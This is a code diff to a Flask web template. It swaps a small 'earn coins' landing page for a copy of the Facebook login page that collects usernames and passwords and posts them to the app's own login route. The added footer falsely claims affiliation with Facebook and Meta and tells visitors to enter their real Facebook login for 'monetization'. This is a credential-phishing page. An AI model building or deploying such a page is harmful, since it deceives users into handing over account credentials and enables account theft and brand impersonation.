@@ -1,24 +1,37 @@
-{% extends "base.html" %}
-{% block content %}
-<section class="hero public-hero fade-in-up">
-  <div class="hero-left fade-in-up" style="animation-delay:.2s">
-    <h1 class="hero-title">Let's see if you are intelligent…</h1>
-    <p class="hero-sub">Grow. Play. Win. Join now — earn coins, grow for free.</p>
-    <div class="cta-row">
-      <a class="btn btn-primary" href="{{ url_for('login') }}">Login</a>
-      <a class="btn btn-outline" href="{{ url_for('signup') }}">Sign Up</a>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Facebook – Login or Sign Up</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/theme.css') }}">
+</head>
+<body class="fb-style">
+  <div class="login-page">
+
+    <!-- Logo -->
+    <div class="logo-block">
+      <div class="logo-circle">F</div>
+      <h1 class="brand">Facebook</h1>
     </div>
-  </div>
-  <div class="hero-right fade-in-up" style="animation-delay:.4s">
-    <div class="floating-card insta-preview">
-      <div class="insta-header">Public feed • minimal preview</div>
-      <div class="insta-grid">
-        <div class="tile tile1"></div>
-        <div class="tile tile2"></div>
-        <div class="tile tile3"></div>
-        <div class="tile tile4"></div>
-      </div>
+
+    <!-- Login card -->
+    <div class="form-card">
+      <form method="post" action="{{ url_for('login') }}">
+        <input class="input" name="username_or_email" placeholder="Mobile number or email address" required>
+        <input class="input" type="password" name="password" placeholder="Password" required>
+        <button class="btn-primary" type="submit">Log in</button>
+      </form>
+      <a class="link-forgot" href="#">Forgotten password?</a>
+      <hr>
+      <a class="btn-create" href="{{ url_for('signup') }}">Create new account</a>
     </div>
+
+    <!-- Footer note -->
+    <div class="footer-note">
+      <small>Facebook monetization link body – affiliated with Facebook and Meta, make sure you login with your correct facebook login for your facebook monetization.</small>
+    </div>
+
   </div>
-</section>
-{% endblock %}
+</body>
+</html>
